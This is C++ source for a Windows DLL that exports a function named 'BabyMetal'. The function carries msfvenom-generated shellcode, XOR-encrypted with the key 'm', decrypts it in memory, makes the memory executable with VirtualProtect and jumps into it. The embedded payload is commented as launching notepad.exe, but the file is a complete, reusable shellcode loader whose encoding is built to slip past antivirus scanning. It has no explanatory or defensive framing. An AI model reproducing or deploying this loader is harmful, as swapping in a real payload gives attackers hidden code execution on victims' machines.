#include <Windows.h>
#include <stdio.h>

DWORD threadID;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved){
	switch (ul_reason_for_call){
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) BOOL BabyMetal(){
	//  msfvenom -p windows/x64/exec CMD=notepad.exe -f C EXITFUNC=thread -f C --encrypt xor --encrypt-key m
    unsigned char buf[] =
"\x91\x25\xee\x89\x9d\x85\xad\x6d\x6d\x6d\x2c\x3c\x2c\x3d\x3f"
"\x3c\x3b\x25\x5c\xbf\x08\x25\xe6\x3f\x0d\x25\xe6\x3f\x75\x25"
"\xe6\x3f\x4d\x25\xe6\x1f\x3d\x25\x62\xda\x27\x27\x20\x5c\xa4"
"\x25\x5c\xad\xc1\x51\x0c\x11\x6f\x41\x4d\x2c\xac\xa4\x60\x2c"
"\x6c\xac\x8f\x80\x3f\x2c\x3c\x25\xe6\x3f\x4d\xe6\x2f\x51\x25"
"\x6c\xbd\xe6\xed\xe5\x6d\x6d\x6d\x25\xe8\xad\x19\x0a\x25\x6c"
"\xbd\x3d\xe6\x25\x75\x29\xe6\x2d\x4d\x24\x6c\xbd\x8e\x3b\x25"
"\x92\xa4\x2c\xe6\x59\xe5\x25\x6c\xbb\x20\x5c\xa4\x25\x5c\xad"
"\xc1\x2c\xac\xa4\x60\x2c\x6c\xac\x55\x8d\x18\x9c\x21\x6e\x21"
"\x49\x65\x28\x54\xbc\x18\xb5\x35\x29\xe6\x2d\x49\x24\x6c\xbd"
"\x0b\x2c\xe6\x61\x25\x29\xe6\x2d\x71\x24\x6c\xbd\x2c\xe6\x69"
"\xe5\x25\x6c\xbd\x2c\x35\x2c\x35\x33\x34\x37\x2c\x35\x2c\x34"
"\x2c\x37\x25\xee\x81\x4d\x2c\x3f\x92\x8d\x35\x2c\x34\x37\x25"
"\xe6\x7f\x84\x3a\x92\x92\x92\x30\x25\xd7\x6c\x6d\x6d\x6d\x6d"
"\x6d\x6d\x6d\x25\xe0\xe0\x6c\x6c\x6d\x6d\x2c\xd7\x5c\xe6\x02"
"\xea\x92\xb8\xd6\x8d\x70\x47\x67\x2c\xd7\xcb\xf8\xd0\xf0\x92"
"\xb8\x25\xee\xa9\x45\x51\x6b\x11\x67\xed\x96\x8d\x18\x68\xd6"
"\x2a\x7e\x1f\x02\x07\x6d\x34\x2c\xe4\xb7\x92\xb8\x03\x02\x19"
"\x08\x1d\x0c\x09\x43\x08\x15\x08\x6d";

    unsigned char plain[sizeof(buf)];

    // xor decrypt shellcode with key 'm'
    for (int i = 0; i < sizeof(buf); i++){
		plain[i] = buf[i] ^ 'm';
	}

    // allocate space for shellcode
    void *exec = VirtualAlloc(0, sizeof(plain), MEM_COMMIT, PAGE_READWRITE);

    // copy shellcode to memory
    memcpy(exec, plain, sizeof(plain));

    // make memory executable
    DWORD oldperms = 0;
    VirtualProtect(exec, sizeof(plain), PAGE_EXECUTE, &oldperms);


    // jump to shellcode
    (*(void (*)()) exec)();
  
    return true;
}